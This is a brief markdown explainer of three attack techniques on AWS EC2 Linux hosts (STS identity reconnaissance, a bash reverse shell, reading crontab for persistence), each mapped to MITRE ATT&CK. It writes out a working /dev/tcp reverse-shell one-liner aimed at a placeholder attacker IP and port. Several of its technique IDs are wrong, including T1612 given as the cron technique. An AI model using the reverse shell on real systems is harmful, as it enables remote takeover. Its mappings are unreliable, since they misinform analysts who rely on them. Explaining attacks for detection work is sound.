# Selected AWS EC2 Linux Attack Techniques

This document explains three selected attack techniques on AWS EC2 Linux instances, their importance, and their mapping to the MITRE ATT&CK framework.

## 1. `aws sts get-caller-identity`

**Description:**  
This command uses the AWS Security Token Service (STS) to retrieve details about the identity of the AWS entity making the request. It returns the `Account`, `Arn`, and `UserId`, providing attackers information about the role or user context in which their operations are being executed.

**Why It's Important:**  
- **Reconnaissance in the Cloud:** This command is commonly used in cloud environments to understand the privileges and context of the compromised identity.  
- **Privilege Escalation:** By identifying the current role or user and their associated permissions, attackers can determine their next steps for privilege escalation or lateral movement.

**MITRE ATT&CK Mapping:**  
- **Technique:** [T1590.001 - Gather Victim Identity Information: Cloud Accounts](https://attack.mitre.org/techniques/T1590/001/)  
- **Tactic:** Reconnaissance  
- **Use Case:** Attackers use `aws sts get-caller-identity` to enumerate and validate AWS credentials during the reconnaissance phase of a cloud attack.

---

## 2. `bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'`

**Description:**  
This command spawns a reverse shell by redirecting input/output to a remote attacker's machine, enabling them to interact with the compromised system remotely. The `<ATTACKER-IP>` and `<PORT>` should be replaced with the attacker’s IP address and port.

**Why It's Important:**  
- **Initial Access or Persistence:** Reverse shells are used by attackers to gain a foothold on a system after exploiting a vulnerability or misconfiguration.  
- **Command Execution and Data Exfiltration:** Once the reverse shell is established, attackers can execute arbitrary commands, move laterally, or exfiltrate sensitive data.

**MITRE ATT&CK Mapping:**  
- **Technique:** [T1059.004 - Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/)  
- **Tactic:** Execution  
- **Use Case:** Attackers leverage reverse shell commands to execute malicious payloads and maintain access.

---

## 3. `cat /etc/crontab`

**Description:**  
This command displays the contents of the `crontab` file, which contains scheduled tasks for the system. Attackers use this to identify existing jobs and potentially add malicious tasks.

**Why It's Important:**  
- **Persistence and Privilege Escalation:** By understanding the structure of scheduled tasks, attackers can insert malicious cron jobs to maintain persistence.  
- **Discovery:** Revealing scheduled tasks helps attackers identify potential automation routines that can be exploited.

**MITRE ATT&CK Mapping:**  
- **Technique:** [T1612 - Scheduled Task/Job: Unix Cron](https://attack.mitre.org/techniques/T1612/)  
- **Tactic:** Persistence, Discovery  
- **Use Case:** Attackers inspect `crontab` for opportunities to exploit automated tasks or inject malicious commands for persistence.

---

### Summary of Relevance

These techniques highlight key attack scenarios in Linux-based AWS EC2 environments:
1. **`aws sts get-caller-identity`:** Focuses on cloud-specific reconnaissance, identifying access and permissions for further exploitation.
2. **`bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'`:** Demonstrates the use of reverse shells for command execution and remote access.
3. **`cat /etc/crontab`:** Explores discovery and persistence opportunities in Unix-like systems via scheduled tasks.

These techniques collectively cover cloud-specific, execution, and persistence attack vectors, aligning well with different phases of an attack lifecycle.
